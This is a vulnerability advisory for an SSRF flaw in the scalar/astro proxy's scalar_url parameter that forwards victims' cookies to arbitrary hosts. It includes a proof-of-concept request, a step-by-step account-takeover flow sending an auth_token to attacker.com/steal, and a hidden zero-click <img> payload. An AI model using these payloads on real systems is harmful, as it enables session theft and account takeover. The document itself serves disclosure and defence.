# CVE-2026-30118 — SSRF in scalar/astro Proxy Endpoint

**CVE:** CVE-2026-30118
**Affected package:** `scalar/astro` v0.1.13
**Vendor:** scalar.com
**Severity:** Critical (self-hosted deployments with domain-scoped auth cookies)
**Discoverer:** Prasann Nuwal

---

## Vulnerability

The `scalar_url` query parameter of the Scalar proxy endpoint (`proxy.scalar.com` or any
self-hosted instance) passes user-supplied URLs directly to a server-side HTTP fetcher without
validation. The fetcher forwards the full inbound `Cookie` header — along with other request
headers — verbatim to the attacker-controlled destination.

**Endpoint:** `https://<proxy-host>/?scalar_url=<attacker-url>`
**Parameter:** `scalar_url`
**CWE:** CWE-918 (Server-Side Request Forgery)

---

## Proof of Concept — SSRF Confirmed

Trigger the server-side fetch with a Burp Collaborator (or any OOB listener):

```
GET /?scalar_url=http://attacker-listener.example.com/ HTTP/2
Host: proxy.scalar.com
Cookie: scalar-team-uid=<value>; [other .scalar.com cookies]
```

**Captured interaction at attacker listener (from `34.34.244.142` — GCP proxy server):**

```
GET / HTTP/1.1
Host: attacker-listener.example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...
Accept: text/html,application/xhtml+xml,...
Cookie: _li_dcdm_c=.scalar.com; scalar-team-uid=[REDACTED]; _lc2_fpi=[REDACTED]; ph_phc_..._posthog=[REDACTED]
Forwarded: for="[VICTIM-IP]";proto=https
X-Forwarded-For: [VICTIM-IP],[PROXY-IP]
X-Forwarded-Proto: https
Via: 1.1 google
X-Cloud-Trace-Context: [TRACE-ID]
```

The server-side fetch originates from the GCP proxy infrastructure (not the victim's browser),
confirming full SSRF. The `Cookie` header from the victim's browser request is forwarded
verbatim to the attacker's server.

---

## Impact on proxy.scalar.com (Hosted Instance)

On Scalar's own hosted instance, the auth token is stored in `localStorage` and is not a
domain-scoped cookie. The cookies forwarded are therefore non-auth:

| Cookie leaked | Type |
|---|---|
| `scalar-team-uid` | Team/workspace identifier |
| `_li_dcdm_c`, `_lc2_fpi` | LinkedIn LiveIntent analytics |
| `ph_phc_..._posthog` | PostHog analytics (includes user identity) |
| Victim IP | Via `X-Forwarded-For` header |

---

## Account Takeover — Self-Hosted Deployments

This is where the vulnerability becomes critical. `scalar/astro` is a self-hostable package.
When a company deploys it on a shared domain alongside their application — a common
production pattern — the SSRF enables full session token theft.

**Vulnerable deployment pattern:**

```
app.company.com        ← main application (sets JWT cookie)
proxy.company.com      ← scalar/astro proxy (vulnerable endpoint)
```

**Auth cookie scoped to the parent domain:**

```
Set-Cookie: auth_token=eyJhbGciOiJSUzI1NiJ9...; Domain=.company.com; HttpOnly; Secure; SameSite=Lax
```

**Attack flow:**

1. Attacker sets up a listener at `http://attacker.com/steal`
2. Attacker sends victim a link:
   `https://proxy.company.com/?scalar_url=http://attacker.com/steal`
3. Victim clicks the link (or it is embedded as an `<img>` / `<iframe>` for zero-click)
4. `proxy.company.com` performs a server-side fetch to `attacker.com`
5. Because `auth_token` is scoped to `.company.com`, the browser included it in the
   request to `proxy.company.com` — and the proxy forwards it outbound
6. Attacker's listener captures:

```
GET /steal HTTP/1.1
Host: attacker.com
Cookie: auth_token=eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyXzEyMyIsImVtYWlsIjoidi[REDACTED]
Forwarded: for="[VICTIM-IP]";proto=https
X-Forwarded-For: [VICTIM-IP],[PROXY-IP]
```

7. Attacker replays `auth_token` against `app.company.com` — authenticated as victim

**Zero-click variant:** Embed the SSRF URL as an image tag on any page the victim views.
No user interaction beyond page load required.

```html
<img src="https://proxy.company.com/?scalar_url=http://attacker.com/steal" style="display:none">
```

---

## Why This Works

The Scalar proxy does not:
- Strip or sanitize the `Cookie` header before forwarding outbound requests
- Validate or allowlist the `scalar_url` destination
- Implement SSRF mitigations (private IP blocking, scheme restrictions)

The `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` response
headers compound the issue by weakening CORS protections on the proxy response.

---

## CVSS:3.1 Vector

**Self-hosted deployment (Critical):**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` — **Score: 8.7**

| Metric | Value | Reason |
|---|---|---|
| Attack Vector | Network | Remote, no local access needed |
| Attack Complexity | Low | Single crafted URL, no race condition |
| Privileges Required | None | Unauthenticated attacker |
| User Interaction | Required | Victim must visit the crafted URL |
| Scope | Changed | Proxy is the vulnerable component; app account is the impact |
| Confidentiality | High | Full session token disclosed |
| Integrity | High | Attacker can act as victim post-ATO |
| Availability | None | No DoS component |

---

## Timeline

| Date | Event |
|---|---|
| 2026-03-27 | CVE-2026-30118 assigned by MITRE |
| 2025-10-25 | Vendor notified (support@scalar.com) — no response received |
| 2026-05-18 | Public disclosure (90-day window expired 2026-01-23) |

---

## References

- [CVE-2026-30118](https://www.cve.org/CVERecord?id=CVE-2026-30118)
- [scalar/scalar GitHub](https://github.com/scalar/scalar/)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
